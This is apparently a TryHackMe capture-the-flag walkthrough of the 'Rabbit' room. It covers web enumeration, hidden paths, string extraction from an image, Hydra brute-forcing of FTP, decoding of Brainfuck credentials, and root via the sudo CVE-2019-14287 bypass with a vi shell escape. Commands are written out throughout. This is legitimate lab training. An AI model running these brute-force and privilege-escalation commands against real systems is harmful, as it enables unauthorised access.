## Rabbit - TryHackMe Walkthrough

---

**Author:** Sanjay D
**THM-Profile:** cyberdragon1 \[0x9]\[MAGE]

---

## 🧭 Enumeration

We begin with an **Nmap scan** to discover open ports and services running on the target:

```bash
sudo nmap -sV -sS -A -T4 10.10.196.173
```
![alt text](image-57.png)

The scan revealed a **web server running on port 80**. Accessing it in the browser showed the **Apache2 default page**, which gave us no useful information. To explore further, we ran a **Gobuster directory enumeration**:

![alt text](image-58.png)

```bash
gobuster dir -u http://10.10.196.173 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```
![alt text](image-59.png)

This revealed a hidden directory named `/assets`. Browsing through it, we found a file called `style.css`, which contained a suspicious comment with a reference to:

![alt text](image-60.png)

![alt text](image-61.png)

```
/sup3r_s3cr3t_fl4g.php
```

---

## 🎧 Interacting with Hidden Content

Navigating to `/sup3r_s3cr3t_fl4g.php`, a pop appeared prompting to turn of the javascript,after turning javascript off we were met with an video-based page. After **56 seconds**, we heard a hint in the audio:

![alt text](image-62.png)

> “I’ll put you out of your misery **burp** you’re looking in the wrong place.”

This was a clue to **inspect HTTP requests** more closely. We used **Burp Suite** to capture the request to `sup3r_s3cr3t_fl4g.php` and analyze the response.

![alt text](image-63.png)

The response included a new, obscured path:

![alt text](image-64.png)

```
/WExYY2Cv-qU/Hot_Babe.png
```
![alt text](image-65.png)

We downloaded this image to our local Kali machine:

```bash
wget http://10.10.11.201/WExYY2Cv-qU/Hot_Babe.png
```
![alt text](image-66.png)

---

## 🕵️‍♂️ Steganography and Hidden Credentials

With no clear visual clue in the PNG file, we examined it using **ExifTool**:

```bash
exiftool Hot_Babe.png
```
![alt text](image-67.png)

No useful metadata was found. Next, we attempted steganography extraction:

```bash
steghide extract -sf Hot_Babe.png
stegcracker Hot_Babe.png rockyou.txt
```
![alt text](image-68.png)

Both methods failed. As a last resort, we tried extracting printable strings:

```bash
strings Hot_Babe.png
```
![alt text](image-69.png)

Success! This revealed the **FTP username** `ftpuser` and what appeared to be a **bunch of passwords**. We saved those strings into a file called `passwords` and used **Hydra** to brute-force the FTP login:

```bash
hydra -l ftpuser -P passwords ftp://10.10.11.201
```
![alt text](image-70.png)

Hydra identified the correct password, and we logged in to the FTP server. Inside, we discovered a file called `Eli's_creds.txt`, which we downloaded.

![alt text](image-71.png)

---

## 🧠 Decoding Brainfuck

Opening `cred.txt`, we were met with a string of characters in an unfamiliar format. Upon investigation, we discovered it was encoded in **Brainfuck**, an esoteric programming language.

![alt text](image-72.png)

We used an online Brainfuck interpreter to decode the message, revealing the **SSH credentials** for the next user.

![alt text](image-73.png)

Upon SSH login, we received a message from the `root` user addressed to `Gwendoline`. This clue hinted at a possible second user.

![alt text](image-74.png)

---

## 🧍 Accessing Gwendoline’s Account

Using the context from the root message, we searched the system for files referencing `s3cr3t`. We found a suspiciously named file while executing the locate command:

```bash
locate s3cr3t
```

```
the file name : this message is for gwendoline only!
```
![alt text](image-75.png)

Using `cat`, we read its contents and retrieved the **password for the `gwendoline` user**.

![alt text](image-76.png)

We switched users via SSH and were successfully logged in as `gwendoline`. The **user flag** was found in the home directory.

![alt text](image-77.png)

---

## 🚀 Privilege Escalation

We checked `sudo` privileges for `gwendoline`:

```bash
sudo -l
```
![alt text](image-78.png)

The output revealed:

```
(gwendoline) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

Initially, we tried a classic [GTFOBins-vi](https://gtfobins.github.io/gtfobins/vi/) method:

![alt text](image-79.png)

```bash
vi -c ':!/bin/sh' /dev/null
```
![alt text](image-80.png)

But it failed.

Upon researching, we discovered a known vulnerability: **CVE-2019-14287**, which affects how `sudo` interprets user IDs.

Using this vulnerability, we ran:

```bash
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```

Inside `vi`, we executed:

```
:!/bin/sh
```

A root shell was spawned. Verifying with `id` confirmed root access. We navigated to `/root` and retrieved the **root flag**:

```bash
cat /root/root.txt
```
![alt text](image-81.png)

---

## ✅ Summary

* **Enumeration** revealed a web server and hidden paths leading to audio hints and an image.
* **Steganography and string extraction** helped reveal FTP credentials.
* **FTP access** provided a Brainfuck-encoded message, which we decoded for SSH credentials.
* SSH login led to a second user (`gwendoline`) and eventually **privilege escalation** via a `vi` command vulnerability.
* **CVE-2019-14287** was exploited to bypass restricted `sudo` configurations and spawn a root shell.
* Pwned Rabbit !!!!
  
![alt text](image-82.png)

---
